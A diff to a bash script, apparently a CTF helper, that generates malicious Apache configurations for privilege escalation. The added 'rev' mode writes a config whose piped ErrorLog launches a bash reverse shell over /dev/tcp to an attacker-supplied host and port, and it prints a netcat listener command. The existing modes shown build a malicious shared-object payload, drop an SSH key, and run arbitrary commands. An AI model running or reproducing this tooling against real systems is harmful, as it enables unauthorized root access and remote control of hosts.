@@ -1,7 +1,6 @@
 #!/bin/bash
-
 #
-# apache-privesc-helper-thing.sh
+# apache-privesc-helper.sh
 # CTF helper to generate Apache configs and malicious modules for privesc
 #
 
@@ -85,11 +84,32 @@ EOF
     echo "[+] Config ready at $CONFIG_FILE"
 }
 
+make_revshell_conf() {
+    LHOST="$1"
+    LPORT="$2"
+    if [[ -z "$LHOST" || -z "$LPORT" ]]; then
+        echo "[-] Usage: $0 rev <LHOST> <LPORT>"
+        exit 1
+    fi
+    RSHELL="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+    cat > "$CONFIG_FILE" <<EOF
+ServerRoot "/tmp"
+ServerName localhost
+PidFile "/tmp/httpd.pid"
+ErrorLog "|/bin/sh -c '$RSHELL'"
+Listen 8080
+LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
+EOF
+    echo "[+] Reverse shell config ready at $CONFIG_FILE"
+    echo "[!] Start a listener with: nc -lvnp $LPORT"
+}
+
 usage() {
     echo "Usage:"
     echo "  $0 so            # build .so payload and config (LoadFile)"
     echo "  $0 key <pubkey>  # build CustomLog config to drop pubkey"
     echo "  $0 cmd <command> # build ErrorLog config to run command"
+    echo "  $0 rev <LHOST> <LPORT> # build ErrorLog config for reverse shell"
 }
 
 banner
@@ -106,6 +126,10 @@ case "$1" in
     cmd)
         shift
         make_errorlog_conf "$*"
+        ;;
+    rev)
+        shift
+        make_revshell_conf "$1" "$2"
         ;;
     *)
         usage
